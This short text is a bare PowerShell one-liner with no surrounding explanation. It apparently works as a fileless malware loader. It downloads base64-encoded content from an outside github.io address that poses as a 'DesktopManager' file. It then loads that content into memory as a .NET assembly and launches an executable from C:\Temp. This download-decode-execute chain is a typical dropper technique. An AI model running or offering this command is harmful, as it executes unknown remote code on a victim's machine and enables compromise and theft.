[Reflection.Assembly]::Load([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://foriki.github.io/foriki_/exes/DesktopManager.txt'))); Start-Process "C:\Temp\yas.exe"
